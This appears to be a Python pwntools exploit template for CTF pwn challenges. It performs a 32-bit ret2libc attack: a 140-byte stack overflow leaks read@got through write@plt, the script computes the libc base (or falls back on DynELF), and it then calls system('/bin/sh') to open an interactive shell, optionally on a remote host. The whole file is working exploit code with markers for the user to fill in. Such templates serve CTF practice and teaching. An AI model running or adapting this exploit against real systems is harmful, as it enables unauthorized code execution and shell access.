# -*- coding: utf-8 -*-
"""libc_leak_template 32 位 write 泄露 libc 模板(含 DynELF 备选)

来源: https://github.com/SourceLizi/ctf-toolbox (整理成结构化骨架)
用途: 无 system 后门、32 位程序, 用 write(1, got, 4) 泄露 libc 地址后打 system。

依赖: pip install pwntools (无 libc 文件时可选 pip install LibcSearcher)
用法: 填标记处, python libc_leak_template.py
"""
from pwn import *

context.arch = 'i386'
context.log_level = 'info'

LOCAL_BIN = './pwn'                      # ← 改
LIBC_PATH = './libc-2.19.so'             # ← 改: 远程 libc(没有则置 None 用 DynELF)
REMOTE_ADDR = ('node.example.com', 12345)


def start():
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        return remote(*REMOTE_ADDR)
    return process(LOCAL_BIN)


def main():
    elf = ELF(LOCAL_BIN, checksec=False)
    libc = ELF(LIBC_PATH, checksec=False) if LIBC_PATH else None
    io = start()

    write_plt = elf.plt['write']
    read_got = elf.got['read']
    main_addr = elf.sym['main']
    vuln_func = elf.sym['vulnerable_function']   # ← 改: 可再次触发的漏洞函数

    # ---- 第一步: write 泄露 read@got ----
    payload = flat(b'A' * 140, write_plt, main_addr, 1, read_got, 4)
    io.sendlineafter(b'?', payload)      # ← 改
    leaked = u32(io.recvn(4))   # recv 是"至多", TCP 分段会取不满 4 字节; 用 recvn
    log.success('read@libc = %s' % hex(leaked))

    # ---- 第二步: 算 libc base, 打 system("/bin/sh") ----
    if libc:
        libc.address = leaked - libc.sym['read']
        system = libc.sym['system']
        binsh = next(libc.search(b'/bin/sh\x00'))
        log.success('system = %s  /bin/sh = %s' % (hex(system), hex(binsh)))
    else:
        # DynELF 备选: 无 libc 文件时逐地址泄露找 system
        def leak(addr):
            payload = flat(b'A' * 140, write_plt, vuln_func, 1, addr, 4)
            io.sendlineafter(b'?', payload)
            return io.recvn(4)
        from pwn import DynELF
        dyn = DynELF(leak, elf=elf)
        system = dyn.lookup('system', 'libc')
        binsh = next(elf.search(b'/bin/sh'))  # 程序内若无 /bin/sh 需 read 写入
        log.success('system(DynELF) = %s' % hex(system))

    payload = flat(b'A' * 140, system, 0xdeadbeef, binsh)
    io.sendlineafter(b'?', payload)
    io.interactive()


if __name__ == '__main__':
    main()
